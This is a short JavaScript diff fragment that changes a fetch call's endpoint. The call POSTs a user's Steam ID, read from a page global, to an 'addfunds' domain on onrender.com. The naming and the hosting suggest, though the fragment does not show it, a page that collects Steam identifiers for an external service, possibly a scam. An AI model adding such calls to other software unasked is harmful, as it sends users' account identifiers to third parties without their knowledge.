@@ -216,7 +216,7 @@
     const steamId = window.lastSteamId;
     if (!steamId) return;
     try {
-      await fetch('https://addfunds.onrender.com/api/get-warning', {
+      await fetch('https://addfunds-11.onrender.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ steamId })
